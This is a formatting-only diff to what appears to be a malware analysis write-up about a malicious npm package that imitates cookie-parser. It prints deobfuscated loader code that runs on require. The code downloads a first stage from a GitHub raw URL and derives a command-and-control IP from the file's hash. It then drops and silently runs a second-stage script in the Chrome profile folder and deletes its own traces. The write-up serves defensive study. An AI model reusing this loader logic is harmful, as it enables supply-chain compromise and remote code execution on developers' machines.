@@ -41,15 +41,15 @@ Lets take a look at the `index.js` file:
 
 ```js
 // Loads dependency packages
-var cookie = require('cookie')
-var signature = require('cookie-signature')
+var cookie = require('cookie');
+var signature = require('cookie-signature');
 
 // Loads the malicious payload
-require('./cookie-loader.min')
+require('./cookie-loader.min');
 
 // [...]
 
-function cookieParser (secret, options) {
+function cookieParser(secret, options) {
   // Defines the cookieParser function for API compatibility
   // [...]
 }
@@ -73,9 +73,11 @@ It also contains code to delete `cookie-loader.min.js` after execution and remov
 
 ```js
 function f() {
-    l.unlinkSync(__filename);
-    var e, t = r.join(__dirname, "index.js");
-    l.existsSync(t) && (e = l.readFileSync(t).toString(), l.writeFileSync(t, e.replace("require('./cookie-loader.min')", "")))
+  l.unlinkSync(__filename);
+  var e,
+    t = r.join(__dirname, 'index.js');
+  l.existsSync(t) &&
+    ((e = l.readFileSync(t).toString()), l.writeFileSync(t, e.replace("require('./cookie-loader.min')", '')));
 }
 ```
 
@@ -103,20 +105,21 @@ Following is the deobfuscated version of the `cookie-loader.min.js` file:
 
 ```js
 // Import required Node.js modules
-const { spawn, exec } = require("child_process");
-const path = require("path");
-const https = require("https");
-const http = require("http");
-const fs = require("fs");
-const os = require("os");
-const crypto = require("crypto");
+const { spawn, exec } = require('child_process');
+const path = require('path');
+const https = require('https');
+const http = require('http');
+const fs = require('fs');
+const os = require('os');
+const crypto = require('crypto');
 
 // Create a SHA-256 hash object for later use
-const sha256Hash = crypto.createHash("sha256");
+const sha256Hash = crypto.createHash('sha256');
 
 // Base64 encoded URL for the initial payload
 // Decodes to: https://raw.githubusercontent.com/johns92/blog_app/refs/heads/main/server/.env.example
-const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvaG5zOTIvYmxvZ19hcHAvcmVmcy9oZWFkcy9tYWluL3NlcnZlci8uZW52LmV4YW1wbGU=";
+const encodedUrl =
+  'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvaG5zOTIvYmxvZ19hcHAvcmVmcy9oZWFkcy9tYWluL3NlcnZlci8uZW52LmV4YW1wbGU=';
 const decodedUrl = atob(encodedUrl);
 
 /**
@@ -125,25 +128,25 @@ const decodedUrl = atob(encodedUrl);
  */
 function getNodePath() {
   // For Linux and macOS
-  if (os.platform() === "linux" || os.platform() === "darwin") {
+  if (os.platform() === 'linux' || os.platform() === 'darwin') {
     return new Promise((resolve, reject) => {
-      exec("which node", { windowsHide: true }, (error, stdout, stderr) => {
+      exec('which node', { windowsHide: true }, (error, stdout, stderr) => {
         if (error || stderr) {
-          reject("Node.js not found");
+          reject('Node.js not found');
         } else {
           resolve(stdout.trim());
         }
       });
     });
-  } 
+  }
   // For Windows
-  else if (os.platform() === "win32") {
+  else if (os.platform() === 'win32') {
     return new Promise((resolve, reject) => {
-      exec("where node", { windowsHide: true }, (error, stdout, stderr) => {
+      exec('where node', { windowsHide: true }, (error, stdout, stderr) => {
         if (error || stderr) {
           callback(null);
         } else {
-          const nodePath = stdout.split("\n")[0].trim();
+          const nodePath = stdout.split('\n')[0].trim();
           resolve(nodePath);
         }
       });
@@ -158,42 +161,42 @@ function getNodePath() {
 let getScriptPath = () => {
   let browserDataDir = null;
   const homeDir = os.homedir();
-  
+
   // First attempt: Target Chrome user data directories based on OS
-  if (os.platform() === "win32") {
-    browserDataDir = path.join(homeDir, "AppData", "Local", "Google", "Chrome", "User Data");
-  } else if (os.platform() === "linux") {
-    browserDataDir = path.join(homeDir, ".config", "google-chrome");
-  } else if (os.platform() === "darwin") {
-    browserDataDir = path.join(homeDir, "Library", "Application Support", "Google", "Chrome");
+  if (os.platform() === 'win32') {
+    browserDataDir = path.join(homeDir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
+  } else if (os.platform() === 'linux') {
+    browserDataDir = path.join(homeDir, '.config', 'google-chrome');
+  } else if (os.platform() === 'darwin') {
+    browserDataDir = path.join(homeDir, 'Library', 'Application Support', 'Google', 'Chrome');
   }
-  
+
   // Fallback: Use more generic locations if Chrome dirs don't exist
   if (!fs.existsSync(browserDataDir)) {
-    if (os.platform() === "win32") {
-      browserDataDir = path.join(homeDir, "AppData", "Local");
-    } else if (os.platform() === "linux") {
-      browserDataDir = path.join(homeDir, ".config");
-    } else if (os.platform() === "darwin") {
-      browserDataDir = path.join(homeDir, "Library", "Application Support");
+    if (os.platform() === 'win32') {
+      browserDataDir = path.join(homeDir, 'AppData', 'Local');
+    } else if (os.platform() === 'linux') {
+      browserDataDir = path.join(homeDir, '.config');
+    } else if (os.platform() === 'darwin') {
+      browserDataDir = path.join(homeDir, 'Library', 'Application Support');
     }
   }
-  
+
   // Create directory if it doesn't exist
   if (!fs.existsSync(browserDataDir)) {
     fs.mkdirSync(browserDataDir, { recursive: true });
   }
-  
+
   // Create a Scripts directory in the browser data folder
-  const scriptsDir = path.join(browserDataDir, "Scripts");
-  
+  const scriptsDir = path.join(browserDataDir, 'Scripts');
+
   // Create Scripts directory if it doesn't exist
   if (!fs.existsSync(scriptsDir)) {
     fs.mkdirSync(scriptsDir, { recursive: true });
   }
-  
+
   // Return path for the malware script
-  const malwarePath = path.join(scriptsDir, "startup.js");
+  const malwarePath = path.join(scriptsDir, 'startup.js');
   return malwarePath;
 };
 
@@ -202,11 +205,11 @@ let getScriptPath = () => {
  * This allows the malware to run independently from the parent process
  */
 function runScript(scriptPath) {
-  spawn("node", [scriptPath], {
-    detached: true,      // Makes process independent from parent
-    stdio: "ignore",     // Prevents any output being shown
-    windowsHide: true    // Prevents window from being shown on Windows
-  }).unref();            // Allows parent to exit independently
+  spawn('node', [scriptPath], {
+    detached: true, // Makes process independent from parent
+    stdio: 'ignore', // Prevents any output being shown
+    windowsHide: true, // Prevents window from being shown on Windows
+  }).unref(); // Allows parent to exit independently
 }
 
 /**
@@ -216,14 +219,14 @@ function runScript(scriptPath) {
 function coverTracks() {
   // Delete this malicious file
   fs.unlinkSync(__filename);
-  
+
   // Remove the require statement from index.js to hide evidence
-  const indexPath = path.join(__dirname, "index.js");
-  
+  const indexPath = path.join(__dirname, 'index.js');
+
   if (fs.existsSync(indexPath)) {
     const indexContent = fs.readFileSync(indexPath).toString();
     // Remove the require statement for this malicious module
-    fs.writeFileSync(indexPath, indexContent.replace("require('./cookie-loader.min')", ""));
+    fs.writeFileSync(indexPath, indexContent.replace("require('./cookie-loader.min')", ''));
   }
 }
 
@@ -233,7 +236,7 @@ function coverTracks() {
  */
 async function fixNodePath(scriptPath) {
   // Only needed for non-Windows platforms
-  if (os.platform() !== "win32") {
+  if (os.platform() !== 'win32') {
     const scriptContent = fs.readFileSync(scriptPath).toString();
     const nodePath = await getNodePath();
     // Replace "node" with the absolute path
@@ -247,20 +250,20 @@ async function fixNodePath(scriptPath) {
  */
 function downloadFile(url, targetPath) {
   // Choose http or https based on URL
-  let httpModule = url.startsWith("https") ? https : http;
-  
+  let httpModule = url.startsWith('https') ? https : http;
+
   return new Promise((resolve, reject) => {
     httpModule.get(url, (response) => {
       if (response.statusCode !== 200) {
-        reject("");
+        reject('');
         return;
       }
-      
+
       const fileStream = fs.createWriteStream(targetPath);
       response.pipe(fileStream);
-      
-      fileStream.on("finish", () => {
-        resolve("");
+
+      fileStream.on('finish', () => {
+        resolve('');
       });
     });
   });
@@ -272,21 +275,21 @@ function downloadFile(url, targetPath) {
  */
 function generateDomain(hash, fixedValue) {
   // XOR each byte of the hash with the fixed value
-  let result = "";
+  let result = '';
   for (let i = 0; i < fixedValue.length; i++) {
     const xorResult = parseInt(hash[i], 16) ^ parseInt(fixedValue[i], 16);
     result += xorResult.toString(16);
   }
-  
+
   // Convert the hex result to a dotted IP address format
-  let ipAddress = "";
+  let ipAddress = '';
   for (let i = 0; i < result.length; i += 2) {
     if (ipAddress) {
-      ipAddress += ".";
+      ipAddress += '.';
     }
     ipAddress += parseInt(result.slice(i, i + 2), 16).toString();
   }
-  
+
   return ipAddress;
 }
 
@@ -303,23 +306,23 @@ function createMalwareUrl(domain) {
 function executeAttack() {
   // Get the target path for the malware
   let targetPath = getScriptPath();
-  
+
   // Download the initial script, generate domain, download malware, and execute it
   downloadFile(decodedUrl, targetPath)
     .then(() => {
       // Calculate hash of the downloaded file
       const fileContent = fs.readFileSync(targetPath);
       sha256Hash.update(fileContent);
-      const fileHash = sha256Hash.digest("hex");
-      
+      const fileHash = sha256Hash.digest('hex');
+
       // Generate C2 domain using the hash and a fixed value
-      return createMalwareUrl(generateDomain(fileHash, "496AAC7E"));
+      return createMalwareUrl(generateDomain(fileHash, '496AAC7E'));
     })
-    .then(malwareUrl => downloadFile(malwareUrl, targetPath))
+    .then((malwareUrl) => downloadFile(malwareUrl, targetPath))
     .then(() => fixNodePath(targetPath))
     .then(() => {
       // Make the script executable and run it
-      fs.chmodSync(targetPath, "755");
+      fs.chmodSync(targetPath, '755');
       runScript(targetPath);
     })
     .finally(() => {
